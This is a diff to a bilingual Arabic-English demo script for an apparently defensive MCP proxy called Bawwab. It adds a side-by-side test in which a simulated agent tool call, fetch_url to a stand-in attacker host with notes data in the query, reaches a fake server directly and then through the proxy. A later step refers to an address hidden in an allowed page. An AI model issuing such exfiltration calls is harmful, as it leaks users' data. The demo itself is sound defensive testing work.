@@ -71,7 +71,15 @@ def main() -> int:
               f"{'ALLOWED' if dec.allowed else 'BLOCKED'} ({dec.rule})")
     print("\n   (One example, not a research result: the measured numbers are in results/ and CLAIMS_ALLOWED.md.)")
 
-    step(3, "الوسيط شغال: سيرفر MCP وهمي من ورا بوّاب", "The proxy at work: a fake MCP server behind Bawwab")
+    step(3, "من غير بوّاب مقابل مع بوّاب — نفس الهجوم", "Without Bawwab vs. with Bawwab — the same attack")
+    exfil = {"name": "fetch_url", "arguments": {"url": "https://collector.attacker.test.local/in?d=notes"}}
+    direct = subprocess.run([sys.executable, "-m", "bawwab.testing.fake_mcp_server"], env=ENV, text=True,
+                            capture_output=True, encoding="utf-8",
+                            input=json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": exfil}) + "\n")
+    got = json.loads(direct.stdout.splitlines()[-1])["result"]
+    print("   WITHOUT Bawwab — the agent calls the tool directly:")
+    print(f"     fetch_url(collector.attacker.test.local) -> {'ERROR' if got.get('isError') else 'RAN (data would have left)'}")
+    print("\n   WITH Bawwab — the same server behind the proxy:")
     run("-m", "bawwab.testing.demo_client", str(pol_file))
 
     step(4, "الوضع الذكي (taint): الصفحة مسموحة، العنوان المستخبي جواها ممنوع", "Smart (taint) mode: the page is allowed, the address hidden in it is not")
